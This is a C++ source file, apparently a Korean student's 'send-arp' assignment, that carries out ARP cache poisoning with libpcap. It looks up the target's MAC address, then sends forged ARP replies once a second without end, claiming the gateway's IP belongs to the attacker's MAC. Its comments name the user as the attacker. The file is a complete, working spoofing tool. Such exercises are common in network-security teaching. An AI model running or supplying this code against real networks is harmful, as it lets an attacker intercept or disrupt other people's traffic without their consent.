#include "network.h"
#include <cstdio>
#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <netinet/ether.h>
#include <net/if.h>
#include <sys/ioctl.h>

// 코드 흐름
#define PCAP_ERRBUF_SIZE 256

using namespace std;

// get_mac_address, get_ip_address GPT 사용했습니다.
// https://chatgpt.com/share/688eda95-fa28-8004-8578-516519effd41
int get_ip_address(const std::string& device, Ip& dest_ip) {
    int sock;
    struct ifreq ifr;

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, device.c_str(), IFNAMSIZ - 1);

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl(SIOCGIFADDR)");
        close(sock);
        return -1;
    }

    struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
    dest_ip = Ip(ntohl(ipaddr->sin_addr.s_addr));  // ✅ Ip 객체로 저장
    close(sock);
    return 0;
}

int get_mac_address(const std::string& device, Mac& mac_out) {
    int sock;
    struct ifreq ifr;

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, device.c_str(), IFNAMSIZ - 1);

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl(SIOCGIFHWADDR)");
        close(sock);
        return -1;
    }

    mac_out = Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);  // ✅ MAC 객체로 저장
    close(sock);
    return 0;
}

EthArpPacket makeArpReq(Ip srcIp, Mac srcMac, Ip targetIp) {
    
    EthArpPacket arpReqPacket;
    arpReqPacket.eth_.smac_ = srcMac;
	arpReqPacket.eth_.dmac_ = Mac::broadcastMac();
    arpReqPacket.eth_.type_ = htons(EthHdr::Arp);

    arpReqPacket.arp_.hln_ = Mac::Size;
	arpReqPacket.arp_.pln_ = Ip::Size;
	arpReqPacket.arp_.op_ = htons(ArpHdr::Request);
    arpReqPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
	arpReqPacket.arp_.pro_ = htons(EthHdr::Ip4);
    arpReqPacket.arp_.smac_ = srcMac;
    arpReqPacket.arp_.sip_= htonl(uint32_t(srcIp));
    arpReqPacket.arp_.tmac_ = Mac::nullMac();
    arpReqPacket.arp_.tip_ = htonl(uint32_t(targetIp));

    return arpReqPacket;
}

EthArpPacket makeArpRes(Ip gatewayIp, Mac myMac, Ip targetIp, Mac targetMac) {

    EthArpPacket arpReqPacket;
    arpReqPacket.eth_.smac_ = myMac;
	arpReqPacket.eth_.dmac_ = targetMac;
    arpReqPacket.eth_.type_ = htons(EthHdr::Arp);

    arpReqPacket.arp_.hln_ = Mac::Size;
	arpReqPacket.arp_.pln_ = Ip::Size;
	arpReqPacket.arp_.op_ = htons(ArpHdr::Reply);
    arpReqPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
	arpReqPacket.arp_.pro_ = htons(EthHdr::Ip4);
    arpReqPacket.arp_.smac_ = myMac;
    arpReqPacket.arp_.sip_= htonl(uint32_t(gatewayIp));
    arpReqPacket.arp_.tmac_ = targetMac;
    arpReqPacket.arp_.tip_ = htonl(uint32_t(targetIp));

    return arpReqPacket;
}

// 이건 내가 작성
Mac get_target_mac(pcap_t* pcap, Ip myIp, Mac myMac, Ip targetIp) {

    // 패킷 만들기
    EthArpPacket packet = makeArpReq(myIp, myMac, targetIp);    
    
    //결과를 결과패킷 수신, 파싱
    while (true) {
        // 패킷 수신
        int sendRes = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (sendRes != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", sendRes, pcap_geterr(pcap));
        }

		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}

        // packet을 구조체로 변환
        const struct EthArpPacket* ethArpPacket = (const struct EthArpPacket*)packet;

        // eth 타입이 ARP ARP 타입이 reply, 출발지, 목적지
        if (ethArpPacket->eth_.type_ != htons(EthHdr::Arp)) continue;
        if (ethArpPacket->arp_.op_ != htons(ArpHdr::Reply)) continue;
        if (ethArpPacket->arp_.sip_ != htonl(uint32_t(targetIp))) continue;
        if (ethArpPacket->arp_.tip_ != htonl(uint32_t(myIp))) continue;

        Mac resultMac = ethArpPacket->arp_.smac_;
        return resultMac;
    }
    return Mac::nullMac();
}



int main(int argc, char* argv[]) {

    // 입력 예외 처리
    if (argc != 4) {
        printf("인자 개수가 안 맞음.\n입력포멧 : send-arp wlan0 192.168.10.2 192.168.10.1");
        return -1;
    }

    char* dev = argv[1];
    Ip targetIp(argv[2]);
    Ip gatewayIp(argv[3]);
    
    // 공격자(나) ip
    Ip myIp;
    get_ip_address(dev, myIp);

    printf("my IP : %s\n", std::string(myIp).c_str());
    
    // 공격자(나) mac
    Mac myMac;
    get_mac_address(dev, myMac);

    printf("my MAC : %s\n", std::string(myMac).c_str());

    // 패킷 캡쳐
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
		return -1;
	}

    // 상대 mac
    Mac tragetMac = get_target_mac(pcap, myIp, myMac, targetIp);
    printf("targetMac : %s\n", std::string(tragetMac).c_str());

    // 패킷 수신
    while (true) {
        
        // 패킷 만들기
        EthArpPacket arpRes = makeArpRes(gatewayIp, myMac, targetIp, tragetMac);
        // 패킷 보내기 반복~~
        int sendRes = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&arpRes), sizeof(EthArpPacket));
        if (sendRes != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", sendRes, pcap_geterr(pcap));
        }

        sleep(1);
    }
    return 0;
}